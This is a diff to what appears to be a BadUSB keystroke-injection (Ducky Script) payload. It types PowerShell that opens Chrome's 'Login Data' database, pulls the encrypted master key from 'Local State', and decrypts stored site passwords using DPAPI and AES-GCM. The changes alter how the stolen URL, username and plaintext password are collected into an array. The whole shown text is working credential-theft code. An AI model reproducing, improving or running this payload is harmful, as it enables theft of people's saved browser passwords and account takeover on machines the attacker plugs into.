@@ -38,20 +38,22 @@ STRING $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
 ENTER
 STRING $t={($args[0]|%{[char]$_})-join''}
 ENTER
+STRING $l=@()
+ENTER
 STRING if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 ENTER
 STRING $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
 ENTER
-STRING for(;!([W]::S($s)%100)){$l=[W]::T($s,0)+","+[W]::T($s,3)
+STRING for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
 ENTER
 STRING $c=[W]::B($s,5)
 ENTER
-STRING try{$l+","+(.$t $u::Unprotect($c,$n,0))}catch{if($x){$k=$c.length
+STRING try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
 ENTER
 STRING $e=[byte[]]::new($k-31)
 ENTER
-STRING $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)
+STRING $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=(.$t $e)}
 ENTER
-STRING $l+","+(.$t $e)}}}
+STRING $l
 ENTER
 ENTER
